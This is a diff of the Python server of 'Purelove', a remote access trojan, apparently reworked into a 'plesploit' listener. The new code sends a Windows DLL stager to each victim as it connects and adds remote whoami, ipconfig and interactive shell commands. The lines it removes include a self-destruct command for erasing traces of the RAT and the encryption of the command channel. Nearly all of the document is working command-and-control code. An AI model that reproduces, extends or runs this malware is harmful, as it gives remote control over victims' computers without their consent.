@@ -10,58 +10,44 @@ import argparse
 import readline
 import socket
 import sys
+import time
 import threading
+from core import starger
 
-from core.crypto import encrypt, decrypt, diffie_hell_man
 
-BANNER = '''
-
- ____     ___  ____    ___   __ __  ____   ___   
-|    \   /  _]|    \  /   \ |  |  ||    \ |   \  
-|  D  ) /  [_ |  o  )|     ||  |  ||  _  ||    \ 
-|    / |    _]|     ||  O  ||  |  ||  |  ||  D  |
-|    \ |   [_ |  O  ||     ||  :  ||  |  ||     |   
-|  .  \|     ||     ||     ||     ||  |  ||     |
-|__|\_||_____||_____| \___/  \__,_||__|__||_____|
-
-        https://github.com/hucmosin/purelove
-        
-    ___________________
-   |,-----.,-----.,---.\
-   ||     ||     ||    \\
-   |`-----'|-----||-----\`----.
-   [       |    -||-   _|    (|
-   [  ,--. |_____||___/.--.   |
-   =-(( `))-----------(( `))-==
-  mosin`--'             `--'
-
-'''
-
-CLIENT_COMMANDS = [ 'cat','shell', 'ls', 'pwd','selfdestruct','wget','unzip']
+CLIENT_COMMANDS = ['shell', 'getuid', 'ipconfig']
 
 HELP_TEXT = '''
 
+Server Command
+==============
+
 Command               Description
 -------               -----------
-cat <file>            Output a file to the screen.
 session <id>          Connect to a client.
 sessions              List connected clients.
-shell                 Execute a command on the target,get os shell
 help                  Show this help menu.
 kill                  Kill the client connection.
-ls                    List files in the current directory.
-pwd                   Get the present working directory.
-quit                  Exit the server and keep all clients alive.
-selfdestruct          Remove all traces of the RAT from the target system.
-unzip <file>          Unzip a file.
-wget <url>            Download a file from the web.'''
+quit                  Exit the server.
+
+Client Command
+==============
+
+Command               Description
+-------               -----------
+getuid                Get Client OS Whoami.
+ipconfig              Get Client OS eth infomations
+shell                 Execute a command on the target,get os shell.
+'''
 
 
 
-
+#开启监听服务
 class Server(threading.Thread):
-    clients      = {}       
-    client_count = 1        
+    clients      = {}
+    buf          = 1024
+    client_count = 1
+    current_flag = True
     current_client = None  
 
     def __init__(self,host, port):
@@ -74,104 +60,123 @@ class Server(threading.Thread):
     def run(self):
         while True:
             conn, addr = self.s.accept()  
-            dhkey = diffie_hell_man(conn) 
             client_id = self.client_count 
-            client = ClientConnection(conn, addr, dhkey, uid=client_id)
-            #client = ClientConnection(conn, addr, uid=client_id)
-            self.clients[client_id] = client 
+            client = ClientConnection(conn, addr, uid=client_id)
+            self.send_starge(client)
+            self.clients[client_id] = client #加入session[]
             self.client_count += 1  
-
- 
+    #发送starge
+    def send_starge(self,client):
+        dll_len,dll_data = starger.get_win_rple()
+        client.conn.send(dll_len)
+        time.sleep(2)
+        client.conn.send(dll_data)
+        
+    #发送数据
     def send_client(self, message, client):
         try:
-            enc_message = encrypt(message, client.dhkey) 
-            client.conn.send(enc_message)
+            message += '\n'
+            client.conn.send(message)
         except Exception as e:
             print '[!] Error: {}'.format(e) 
 
+    #接收返回数据
     def recv_client(self, client):
         try:
-            recv_data = client.conn.recv(4096)
-            print decrypt(recv_data, client.dhkey) 
-            #print recv_data
+            #循环接收所有数据
+            recv_len = 1  
+            response = ''
+            while recv_len:
+                data = client.conn.recv(1024)
+                recv_len = len(data)  
+                response += data  
+                if recv_len < 1024:
+                    break
+            print response,
+            #返回数据
         except Exception as e:
             print '[!] Error: {}'.format(e)
 
+    #选择session
     def select_client(self, client_id):
         try:
             self.current_client = self.clients[int(client_id)] 
             print '[*] Client {} selected.'.format(client_id)
         except (KeyError, ValueError):
             print '[!] Error: Invalid Client ID.'
-
+            
+    #移除连接
     def remove_client(self, key):
         return self.clients.pop(key, None)
 
+    #断开连接
     def kill_client(self, _):
         self.send_client('kill', self.current_client) 
         self.current_client.conn.close()              
         self.remove_client(self.current_client.uid)   
         self.current_client = None                    
 
-    def selfdestruct_client(self, _):
-        self.send_client('selfdestruct', self.current_client) 
-        self.current_client.conn.close()
-        self.remove_client(self.current_client.uid)
-        self.current_client = None
-
+    
+    #获取当前连接数
     def get_clients(self):
         return [v for _, v in self.clients.items()]
 
+    def exec_shell(self,server):
+        '''
+        @本函数需传入一个socket套接字，因为为了与windows下的命令管道相连接，配合本监听程序
+        '''
+        from core import nc_cmd_shell
+        nc_cmd_shell.nc(server)
+    
+    #打印连接数
     def list_clients(self, _):
         print 'ID   Client Address'
         print '--   --------------'
         for k, v in self.clients.items():
             print '{:>2}   {}'.format(k, v.addr[0])
 
-    def cmd_shell(self,server):
-        pass
-
-    
+    #退出监听服务端
     def quit_server(self, _):
         if raw_input(u'是否退出 (y/N)? ').startswith('y'):
             for c in self.get_clients():
-                self.send_client('quit', c)    
+                self.send_client('kill', c)    
             self.s.shutdown(socket.SHUT_RDWR)   
             self.s.close()
             sys.exit(0)
 
+    #打印帮助
     def print_help(self, _):
         print HELP_TEXT
 
-
+#连接交换初始化
 class ClientConnection():
-    def __init__(self, conn, addr, dhkey, uid=0):
+    def __init__(self, conn, addr, uid=0):
         self.conn  = conn
         self.addr  = addr
-        self.dhkey = dhkey
         self.uid   = uid
 
 
-def run_hander(host,port):
+#启动监听
+def run_handler(host,port):
     client = None
-
-    print BANNER
-
+    send_cmd = ""
+    flag = False
+    
     server = Server(host,port)
     server.setDaemon(True)
     server.start()
-    print 'Purelove server {host} listening for connections on port {port}.'.format(host = host,
-                                                                                port = port)
-
+    print '[*] Purelove server {host} listening on port {port}.'.format(host = host,
+                                                                        port = port)
+    #server监听命令
     server_commands = {
         'session':       server.select_client,
         'sessions':      server.list_clients,
         'help':          server.print_help,
         'kill':          server.kill_client,
         'quit':          server.quit_server,
-        'selfdestruct':  server.selfdestruct_client
     }
 
+    #tab键监听
     def completer(text, state):
         commands = CLIENT_COMMANDS + [k for k, _ in server_commands.items()]
 
@@ -183,37 +188,48 @@ def run_hander(host,port):
 
     readline.parse_and_bind('tab: complete')
     readline.set_completer(completer)
-
-    while True:
-        if Server.clients:
-            if server.current_client:
-                ccid = server.current_client.uid
-            else:
-                ccid = '?'
-
-            prompt = raw_input('rebound {}> '.format(ccid)).rstrip()
-
-            if not prompt:
-                continue
-
-            cmd, _, action = prompt.partition(' ')
-
-            if cmd in server_commands:
-                server_commands[cmd](action)
-
-            elif cmd in CLIENT_COMMANDS:
-                if ccid == '?':
-                    print '[-] Error: No client selected.'
-                    continue
-
-                server.send_client(prompt, server.current_client)
-                server.recv_client(server.current_client)
-
-            else:
-                print '[!] Invalid command, type "help" to see a list of commands.'
-
-
-
-
-
     
+    #开始循环监听连接
+    while True:
+        if server.current_flag == True:
+            #初始化接收参数数据
+            prompt = ""
+            #当有连接时，进行操作
+            if Server.clients:
+                if server.current_client:
+                    ccid = server.current_client.uid
+                else:
+                    ccid = '?'
+                #对shell进行操作
+                prompt = raw_input('plesploit {}> '.format(ccid)).rstrip()
+                if not prompt:
+                    continue
+                    
+                cmd, _, action = prompt.partition(' ')
+
+                if cmd in server_commands:
+                    server_commands[cmd](action)
+
+                elif cmd in CLIENT_COMMANDS:
+                    if ccid == '?':
+                        print '[-] Error: No client selected.'
+                        continue
+        
+                    if cmd == "shell":
+                        send_cmd = "shell"
+                        server.send_client(send_cmd, server.current_client)
+                        server.exec_shell(server)
+                        server.current_flag = False
+                    elif cmd == "getuid":
+                        send_cmd = "whoami"
+                        server.send_client(send_cmd, server.current_client)
+                        server.recv_client(server.current_client)
+                    elif cmd == "ipconfig":
+                        send_cmd = "ipconfig"
+                        server.send_client(send_cmd, server.current_client)
+                        server.recv_client(server.current_client)
+                    else:
+                        print '[!] Invalid command, type "help" to see a list of commands.'
+                else:
+                    print '[!] Invalid command, type "help" to see a list of commands.'
+
